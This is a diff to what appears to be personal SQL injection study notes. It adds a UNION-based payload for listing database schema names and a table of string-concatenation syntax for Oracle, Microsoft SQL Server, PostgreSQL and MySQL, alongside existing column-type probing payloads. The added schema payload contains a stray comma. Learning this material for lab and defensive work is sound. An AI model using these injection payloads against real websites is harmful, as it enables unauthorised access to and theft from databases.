@@ -16,7 +16,7 @@ PostgreSQL
 MySQL
 	```#comment  
 	-- comment
-	*comment*/``
+	*comment*/```
 
 
 ----------------------
@@ -39,6 +39,12 @@ We can see the data type by trial and error
 ' UNION SELECT NULL,’a’,NULL,NULL -- 
 ' UNION SELECT NULL,NULL,’a’,NULL --
 ' UNION SELECT NULL,NULL,NULL,’a’ --
+
+--------------------
+
+# Get Schema Names
+
+Gifts' UNION SELECT 1, NULL, schema_name, NULL, from information_schema.schemata--
 
 -----------------------
 
@@ -88,3 +94,21 @@ PostgreSQL
 	
 MySQL
 	`SELECT @@version`
+
+
+------------------------
+
+# String concatenation
+
+Oracle
+	'foo'||'bar'
+	
+Microsoft
+	foo'+'bar'
+	
+PostgreSQL
+	'foo'||'bar'
+	
+MySQL
+	'foo' 'bar'` [Note the space between the two strings]
+	CONCAT('foo','bar')`
